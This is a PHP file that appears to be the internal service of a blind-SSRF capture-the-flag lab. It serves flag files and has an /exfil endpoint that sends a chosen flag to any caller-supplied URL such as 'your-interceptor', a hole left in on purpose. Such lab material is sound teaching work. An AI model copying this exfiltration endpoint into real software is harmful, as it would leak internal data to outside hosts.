<?php
// Blind SSRF Internal API Service
// NOT exposed to the internet - only accessible via Docker network
// This service has flags AND an exfiltration endpoint

$uri = $_SERVER['REQUEST_URI'];

// Flag endpoints - returns flag directly
if ($uri === '/flag1' || $uri === '/flag1/') {
    header('Content-Type: text/plain');
    echo "Internal Flag: " . trim(file_get_contents(__DIR__ . '/flags/flag1.txt'));
    exit;
}
if ($uri === '/flag2' || $uri === '/flag2/') {
    header('Content-Type: text/plain');
    echo "Internal Flag: " . trim(file_get_contents(__DIR__ . '/flags/flag2.txt'));
    exit;
}
if ($uri === '/flag3' || $uri === '/flag3/') {
    header('Content-Type: text/plain');
    echo "Internal Flag: " . trim(file_get_contents(__DIR__ . '/flags/flag3.txt'));
    exit;
}

// Exfiltration endpoint - reads flag and sends to target URL
// This simulates how blind SSRF can exfiltrate data by making the
// internal service send data to an attacker-controlled URL
if (strpos($uri, '/exfil') !== false) {
    $level = $_GET['level'] ?? '1';
    $target = $_GET['target'] ?? '';

    $flag_file = __DIR__ . '/flags/flag' . intval($level) . '.txt';
    if (file_exists($flag_file) && $target) {
        $flag = trim(file_get_contents($flag_file));
        // Send the flag to the target interceptor
        $exfil_url = $target . (strpos($target, '?') !== false ? '&' : '?') . 'exfil_flag=' . urlencode($flag) . '&level=' . $level;
        @file_get_contents($exfil_url);

        header('Content-Type: text/plain');
        echo "Data exfiltrated to: $target\n";
        echo "Flag sent successfully.\n";
    } else {
        header('Content-Type: text/plain');
        echo "Error: Missing level or target parameter.\n";
        echo "Usage: /exfil?level=1&target=http://your-interceptor/\n";
    }
    exit;
}

// Admin endpoint
if (strpos($uri, '/admin') !== false) {
    header('Content-Type: text/html');
    echo "<h1>Internal Admin Panel</h1><p>Only accessible from internal network.</p>";
    echo "<p>Flag files available at: /flag1, /flag2, /flag3</p>";
    echo "<p>Exfil endpoint: /exfil?level=N&target=URL</p>";
    exit;
}

http_response_code(404);
header('Content-Type: text/plain');
echo "404 Not Found\nServer: BlindInternalAPI/1.0\n";
